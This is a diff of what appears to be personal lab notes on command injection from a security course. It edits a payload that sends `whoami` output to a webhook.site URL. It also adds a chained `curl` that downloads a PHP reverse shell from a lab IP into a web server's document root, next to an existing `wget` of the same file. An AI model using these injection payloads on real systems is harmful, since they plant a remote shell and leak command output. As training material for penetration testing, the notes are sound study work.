@@ -20,9 +20,9 @@ we get OK again but out ; are being filtered
 
 i/p:
 
-https://webhook.site/c50292e9-da33-4700-a16c-a67e8da06f85/? \`whoami\`
+https://webhook.site/c50292e9-da33-4700-a16c-a67e8da/? \`whoami\`
 
-whoami inside  backtiks which will interpret as a command and execute it
+whoami inside  backtiks which will be interpreted as a command and executed
 
 ![[Pasted image 20230715154505.png]]
 
@@ -59,6 +59,13 @@ start http server again in /tmp folder when rev.php resides
 i/p:
 https://tcm-sec.com \\n wget http://192.168.57.5:8080/rev.php
 
+or
+```sh
+https://tcm-sec.com && curl 192.168.57.5/rev/php > /var/www/html/rev.php
+```
+
+
+output the data of curl to /var/www/html/ directory
 
 ![[Pasted image 20230716004644.png]]
 
